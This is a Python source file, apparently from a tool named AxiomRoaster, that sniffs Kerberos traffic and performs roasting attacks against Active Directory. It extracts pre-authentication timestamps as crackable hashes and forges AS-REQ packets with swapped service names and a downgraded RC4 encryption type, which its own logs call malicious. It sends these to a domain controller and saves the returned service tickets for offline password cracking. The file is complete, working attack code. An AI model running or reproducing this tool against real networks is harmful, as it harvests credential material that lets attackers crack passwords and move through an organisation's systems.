#!/usr/bin/python3

import time
import socket
from scapy.all import ASN1_GENERAL_STRING, ASN1_INTEGER, sniff
from scapy.layers.kerberos import KRB_AS_REP, KRB_AS_REQ, KerberosTCPHeader

from AxiomRoaster.core.parse_args import AxiomArgParser
from AxiomRoaster.objects.Layout import AppLayout

class Sniffer():
    _ROASTED_SPN = []
    _ROASTED_USER = []

    @staticmethod
    def Start():
        args = AxiomArgParser.GetProgramArgs()

        sniff(
            iface=args.iface, # type: ignore
            filter="tcp",
            prn=lambda x: Sniffer.ProcessPacket(x)
        )

    @staticmethod
    def ProcessPacket(packet):
        args = AxiomArgParser.GetProgramArgs()
        etype = 0
        user = ""
        realm = ""
        enc_timestamp = ""

        if KRB_AS_REQ in packet:
            AppLayout.Log(type='INFO', content='Received AS_REQ packet')

            valid = False
            for _padata in packet[KRB_AS_REQ].padata:
                if (_padata.padataType == ASN1_INTEGER(2)):
                    valid = True
                    etype = _padata.padataValue.etype.val
                    user = bytes(packet[KRB_AS_REQ].reqBody.cname.nameString[0])[2:].decode('latin-1')
                    realm = bytes(packet[KRB_AS_REQ].reqBody.realm)[2:].decode('latin-1')
                    enc_timestamp = bytes(_padata.padataValue.cipher)[2:].hex()

            if valid and len(packet[KRB_AS_REQ].reqBody.sname.nameString) == 2:
                AppLayout.Log(type='INFO', content=f'AS_REQ contains an authenticator (etype {etype}), continuing')

                if etype == 18 and user not in Sniffer._ROASTED_USER:
                    asreq_ticket_str = f"$krb5pa${etype}${user}${realm}${enc_timestamp}"
                    f = open("asreq.out", "a+")
                    f.write(f"{asreq_ticket_str}\n")
                    f.close()
                    Sniffer._ROASTED_USER.append(user)
                    AppLayout.Log(type='SUCCESS', content=f'ASREQ-roasted user {user}')
                    AppLayout.AddTicket(type='ASREQ', principal=user, ticket_str=asreq_ticket_str)

                e = KRB_AS_REQ()
                e.pvno = ASN1_INTEGER(5)
                e.msgType = ASN1_INTEGER(10)
                e.padata.append(packet[KRB_AS_REQ].padata[0])
                e.padata.append(packet[KRB_AS_REQ].padata[1])
                e.reqBody.kdcOptions = packet[KRB_AS_REQ].reqBody.kdcOptions
                e.reqBody.cname = packet[KRB_AS_REQ].reqBody.cname
                e.reqBody.realm = packet[KRB_AS_REQ].reqBody.realm
                e.reqBody.sname = packet[KRB_AS_REQ].reqBody.sname
                e.reqBody.sname.nameType = ASN1_INTEGER(1)
                e.reqBody.sname.nameString.pop()
                e.reqBody.sname.nameString.pop()
                e.reqBody.till = packet[KRB_AS_REQ].reqBody.till
                e.reqBody.rtime = packet[KRB_AS_REQ].reqBody.rtime
                e.reqBody.nonce = packet[KRB_AS_REQ].reqBody.nonce
                packet[KRB_AS_REQ] = e
                for _ in range(len(packet[KRB_AS_REQ].reqBody.etype)):
                    packet[KRB_AS_REQ].reqBody.etype.pop()
                packet[KRB_AS_REQ].reqBody.etype.append(ASN1_INTEGER(23))

                for spn in args.spn: # type: ignore
                    packet[KRB_AS_REQ].reqBody.sname.nameString.append(ASN1_GENERAL_STRING(spn.encode())) # type: ignore
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((args.dcs[0], 88)) # type: ignore
                    sock.send(bytes(packet[KerberosTCPHeader]))
                    time.sleep(1)
                    sock.close()
                    packet[KRB_AS_REQ].reqBody.sname.nameString.pop()
                    AppLayout.Log(type='SUCCESS', content=f'Malicious AS_REQ crafted and sent for user {spn}')

        if KRB_AS_REP in packet:
            AppLayout.Log(type='INFO', content='Received AS_REP packet')

            servicename = bytes(packet[KRB_AS_REP].ticket.sname.nameString[0])[2:].decode('latin-1')
            if servicename not in Sniffer._ROASTED_SPN:
                AppLayout.Log(type='INFO', content=f'Received a service ticket for user {servicename}')
                encticket = bytes(packet[KRB_AS_REP].ticket.encPart.cipher)[4:].hex()
                realm = bytes(packet[KRB_AS_REP].crealm)[2:].decode()
                etype = bytes(packet[KRB_AS_REP].ticket.encPart.etype)[2:][0]
                ticket_str = f"$krb5tgs${etype}$*{servicename}${realm}${servicename}*${encticket[:32]}${encticket[32:]}"

                f = open("roasted.out", "a+")
                f.write(f"{ticket_str}\n")
                f.close()

                Sniffer._ROASTED_SPN.append(servicename)
                AppLayout.AddTicket(type='TGS', principal=servicename, ticket_str=ticket_str)
                AppLayout.Update()
            else:
                AppLayout.Log(type='INFO', content=f'Received a service ticket that doesn\'t concern us ({servicename})')

